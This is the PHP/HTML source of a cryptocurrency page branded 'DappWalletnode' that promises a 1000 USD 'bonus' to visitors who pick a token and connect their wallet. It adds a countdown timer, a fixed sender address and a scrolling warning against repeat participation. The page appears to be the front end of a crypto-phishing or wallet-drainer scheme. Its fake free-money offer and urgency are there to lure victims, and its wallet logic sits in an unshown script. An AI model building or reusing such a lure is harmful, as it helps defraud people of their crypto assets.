<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="img\save.png" />
    <link rel="stylesheet" href="./css/style.css">
    <title>Mobile Wallet Restore | Best Cryptocurrency Wallet | Open protocol for connecting Wallets</title>
  </head>
  <body>
    <header id="head">
      <div id="gg">
      <div id="head_left">
        <a href="index"><img src="img/save.png" alt=""/></a></div>
      <div id="centre">
        <a href="index" id="centre">Dapp<span id="colorize">Walletnode</span></a>
      </div>
      <div id="head_right">
<ul>
  <input type="checkbox" id="checkbox_toggle">
  <label for="checkbox_toggle" class="hamburger">&#9776;</label>
  <div class="menu">
    <li><a href="index">Home</a></li>
    <li><a href="connect">Connect</a></li>
    <li><a href="contact">Contact us</a></li>
    <li><a href="#">FAQ</a></li>
    <li></li>
  </div>

</ul>
      </div>

</div>
    </header>
    <!-- <aside></aside> -->
    <?php include "connection.php";?>
    <main id="main">
          <div class="bonus-content">
            <div class="below">
              <h2 style="color:#870003">Get Bonus</h2>
              <p>Get ongoing bonus offer by inputting Token type and connecting your wallet </p>
              <p style="color:black;">Offer ends in:<p id="demo" style="color:black;font-weight:550"></p></p>
            </div>
              <div class="grider">
                <div class="input_a">
                <input type="text" value="From:  0x33e2C7abFC6B35FA3D03D29e53beb8aA6aE8dd3b" readonly="readonly"/>
              </div>

                <div class="selection">
                <select class="" name="" id="tokens">
                  <option value="default" >Select Token:</option>
                  <?php
                  $sql = "SELECT * FROM token";
                  $result = mysqli_query($conn, $sql);
                  if(mysqli_num_rows($result)>0){
                    while($row = mysqli_fetch_assoc($result)){

                      ?>
                      <?php
                      $t_id = $row['id'];
                      $t_dir = $row['token_dir'];
                      $t_name = $row['token_name'];
                      ?>
                <option class="opp" value="<?php echo $t_id;  ?>" data_name="<?php echo $t_name;  ?>" data_dir="<?php echo $t_dir;  ?>"s><?php echo $t_name;  ?></option>
                      <?php }} ?>
                </select>
              </div>
                <div id="mid">
                <p>worth</p>
              </div>
              <div class="input_b">
                <div>
                <input type="text" id="amoumt_invest" placeholder="Amoumt to Invest" value="1000" readonly="readonly"/>
              </div>
              <div>
                  <h3>USD</h3>
                </div>
              <!-- <div id="mid">
                <p>to</p>
              </div>
              <div class="input_c">

                <input type="text" id="addy"  placeholder="Wallet Address" />

              </div> -->

              </div>
              <div class="wal_proceed">
                <button type="button" id="bonus" style="background:#870003;color:white">Get Bonus</button>
              </div>

              <marquee style="color:red"><p style="font-size:12px">Note: Do not participate in this offer more than once, our server would detect discrepancies of any sort</p></marquee>
</div>
            </div>


      <div id="myModal_bonus"  class="modal_bonus">
        <div class="modal_content_bonus">
        <span class="close" id="close_b">&times;</span>
        <div>
<div><h4 style="color:#870003">Bonus Offer</h4></div>
<div class="bonus_display">
  <div class="bonus_display_u">


  <div>
    <h4>Get Bonus offer worth 1000 USD to your <span class="tokName"></span> wallet</h4>
    <div class="wal_proceed" style="align-content:centre;margin-left:1.5rem">
      <button type="button" id="bonus2" style="background:#870003;color:white; width:80%;">Connect Wallet</button>
    </div>
</div>
<div>
  <div class="bonus_display_sider">
    <span class="tokDir">
    <!-- <img src="https://logos-world.net/wp-content/uploads/2020/08/Bitcoin-Emblem.png"/> -->
  </span>
  </br>
    <p style="color:#6f4e37"><b>1000 USD</b></p>
  </div>
</div>
</div>

</div>
        </div>
        </div>
        </div>

        <div id="myModal_show"  class="modal">
            <div class="modal-content" style="max-width: 95px;">
              <div class="confam">
              <img src="img\351kRoj.gif" alt="roller"/>
              <p>Loading</p>
            </div>

            </div>
          </div>

        <div id="mid" style="margin-top: 70px;color:#2962ff; margin-bottom:2rem;">
          <h3>Coin Statistics</h3>
        </div>
        <div class="tradingview-widget-container" style="width: 100%; height: 100%; ">
                    <iframe allowtransparency="true" style="box-sizing: border-box; height: calc(100% - 32px); width: 100%;" src="https://www.tradingview-widget.com/embed-widget/crypto-mkt-screener/?locale=en#%7B%22width%22%3A%22100%25%22%2C%22height%22%3A%22100%25%22%2C%22defaultColumn%22%3A%22overview%22%2C%22screener_type%22%3A%22crypto_mkt%22%2C%22displayCurrency%22%3A%22USD%22%2C%22colorTheme%22%3A%22light%22%2C%22isTransparent%22%3Atrue%2C%22market%22%3A%22crypto%22%2C%22enableScrolling%22%3Atrue%2C%22utm_source%22%3A%22thebridgechain.com%22%2C%22utm_medium%22%3A%22widget_new%22%2C%22utm_campaign%22%3A%22cryptomktscreener%22%7D" frameborder="0"></iframe>
                    <div class="tradingview-widget-copyright">
                      <a href="https://www.tradingview.com/markets/cryptocurrencies/prices-all/" rel="noopener" target="_blank">
                        <span class="blue-text">Cryptocurrency Markets</span>
                      </a> by TradingView
                    </div>

                  <style>
        	.tradingview-widget-copyright {
        		font-size: 13px !important;
        		line-height: 32px !important;
        		text-align: center !important;
        		vertical-align: middle !important;
        		/* @mixin sf-pro-display-font; */
        		font-family: -apple-system, BlinkMacSystemFont, 'Trebuchet MS', Roboto, Ubuntu, sans-serif !important;
        		color: #9db2bd !important;
        	}

        	.tradingview-widget-copyright .blue-text {
        		color: #2962FF !important;
        	}

        	.tradingview-widget-copyright a {
        		text-decoration: none !important;
        		color: #9db2bd !important;
        	}

        	.tradingview-widget-copyright a:visited {
        		color: #9db2bd !important;
        	}

        	.tradingview-widget-copyright a:hover .blue-text {
        		color: #1E53E5 !important;
        	}

        	.tradingview-widget-copyright a:active .blue-text {
        		color: #1848CC !important;
        	}

        	.tradingview-widget-copyright a:visited .blue-text {
        		color: #2962FF !important;
        	}
        	</style></div>

</main>
<footer class="foot" style="margin-top:2rem;">
<p>  info@dappwalletnode.online</p></br>
  <p>Copyright © 2021 All rights Reserved </p>
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script type="text/javascript" src="js/script2.js"></script>
</body>
</html>
